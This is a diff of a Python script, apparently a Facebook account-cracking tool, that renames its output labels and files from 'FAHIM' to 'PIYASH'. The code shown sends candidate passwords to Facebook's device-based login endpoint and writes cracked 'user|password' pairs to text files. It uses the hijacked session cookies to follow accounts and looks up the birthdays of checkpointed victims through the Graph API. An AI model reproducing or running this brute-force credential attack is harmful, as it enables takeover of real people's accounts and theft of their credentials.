@@ -155,7 +155,7 @@ class __xxx__:
             self.sarfrazx(id)
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
-        sys.stdout.write(f"\r\x1b[1;92m[FAHIM] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
+        sys.stdout.write(f"\r\x1b[1;92m[PIYASH-PREMA] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -205,10 +205,10 @@ class __xxx__:
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f"\r{H}[FAHIM-OK] {user} | {pw}")
+                    print(f"\r{H}[PIYASH-OK] {user} | {pw}")
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
-                    open('FAHIM_OK.txt' , 'a').write('%s\n' % wrt)
+                    open('PIYASH_OK.txt' , 'a').write('%s\n' % wrt)
                     self.follow(session,coki)
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
@@ -217,10 +217,10 @@ class __xxx__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s[FAHIM-CP] %s | %s ' % (M, user, pw))
+                        print('\r%s[PIYASH-CP] %s | %s ' % (M, user, pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
-                        open('FAHIM_CP.txt' , 'a').write('%s\n' % wrt)
+                        open('PIYASH_CP.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
@@ -231,7 +231,7 @@ class __xxx__:
                     print('\r%s[PIYASH-CP] %s | %s ' % (M, user, pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('FAHIM_CP.txt' , 'a').write('%s\n' % wrt)
+                    open('PIYASH_CP.txt' , 'a').write('%s\n' % wrt)
                     break
                 else:
                     continue
